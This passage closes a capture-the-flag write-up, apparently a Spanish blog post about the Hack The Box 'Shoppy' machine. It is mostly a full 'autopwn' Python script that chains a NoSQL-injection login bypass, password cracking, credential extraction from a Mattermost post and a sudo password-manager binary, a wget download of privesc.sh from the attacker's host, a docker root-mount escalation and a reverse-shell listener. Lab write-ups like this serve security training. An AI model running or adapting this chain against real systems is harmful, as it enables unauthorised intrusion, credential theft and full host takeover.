		deploy_machine_username = json.loads(response.text)['posts']['ki1a198dybd7icutcjsa1ut6iy']['message'].split()[16]
		deploy_machine_password = json.loads(response.text)['posts']['ki1a198dybd7icutcjsa1ut6iy']['message'].split()[18]

		session.close()
	except Exception as error:
		print('[x] Error: %s' % error)

	return deploy_machine_username, deploy_machine_password

# ssh login (jaeger user) and return credentials from user Deploy
def get_deploy_user_credentials(deploy_machine_username, deploy_machine_password):
	ssh_commands_response = ssh_exec_commands_like(
		deploy_machine_username, deploy_machine_password, 
		['sudo -l', 'sudo -u deploy /home/deploy/password-manager <<< "Sample"'])

	deploy_user_username = ssh_commands_response[1].strip().split('\n')[-2].split()[1]
	deploy_user_password = ssh_commands_response[1].strip().split('\n')[-1].split()[1]

	return deploy_user_username, deploy_user_password

# ssh login (deploy user) and get shell
def interactive_shell(args, deploy_user_username, deploy_user_password):
	init_server = f'/usr/bin/python3 -m http.server {args.port}'
	server_process = subprocess.Popen(shlex.split(init_server), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
	
	log.info('Cron process file uploaded')

	ssh_commands_response = ssh_exec_commands_like(deploy_user_username, deploy_user_password, 
		[f'wget http://{args.ip}:{args.port}/privesc.sh -O /tmp/privesc.sh', 
		'chmod +x /tmp/privesc.sh', 
		f'docker run -it -v /:/tmp --rm alpine sh /tmp/tmp/privesc.sh {args.ip} {args.port}'])
	
	server_process.kill(); time.sleep(5)

	shell = listen(args.port, timeout=60).wait_for_connection()
	
	if shell.sock:
		log.info('Press Ctrl + D to exit')
		shell.interactive()

# exploitation process
def run(args):
	process = log.progress('Starting attack')

	# (1) bypass login to shoppy.htb (Mongo NoSQLi), extract Josh password hash and crack it
	process.status('Extracting and Cracking Josh password hash')
	josh_password_text = cracking_password(password_hash=get_josh_password_hash())
	log.success(f'Cracked password: {josh_password_text}')


	# (2) login mattermost.shoppy.htb (Josh credentials) extract the Jaeger credentials for the Deploy machine
	process.status('Extracting the Jaeger credentials for the Deploy machine')
	deploy_machine_username, deploy_machine_password = get_jaeger_credentials(josh_password_text)
	log.success(f'Credentials obtained: {deploy_machine_username}:{deploy_machine_password}')


	# (3) ssh login (jaeger user), privileges for specific command and binary reverse engineering (get credentials)
	process.status('Extracting the Jaeger credentials for the Deploy machine')
	deploy_user_username, deploy_user_password = get_deploy_user_credentials(deploy_machine_username, deploy_machine_password)
	log.success(f'Credentials obtained: {deploy_user_username}:{deploy_user_password}')


	# (4) ssh login (deploy user) and mount root system with docker socket to execute reverse shell
	process.status('Abusing docker group membership to run privileged commands')
	interactive_shell(args, deploy_user_username, deploy_user_password)

if __name__ == '__main__':
	parser = argparse.ArgumentParser(
		description='Autopwn Shoppy HTB Machine',
		formatter_class=argparse.RawDescriptionHelpFormatter,
		epilog="""Example:
		autopwn.py -i 10.10.10.10 -p 4444
		""")

	parser.add_argument('-i', '--ip', required=True, help='specified IP to receive the shell')
	parser.add_argument('-p', '--port', required=True, help='specified PORT to receive the shell')

	args = parser.parse_args()

	run(args)

# References:
#------------
# https://api.mattermost.com/#tag/authentication
```

![autopwn-run](autopwn_run.png){: .shadow}

> Puedes encontrar el script en mi repositorio [https://github.com/E1P0TR0](https://github.com/E1P0TR0/CVE-Machines_htb/tree/main/Autopwn_Shoppy)
{: .prompt-info}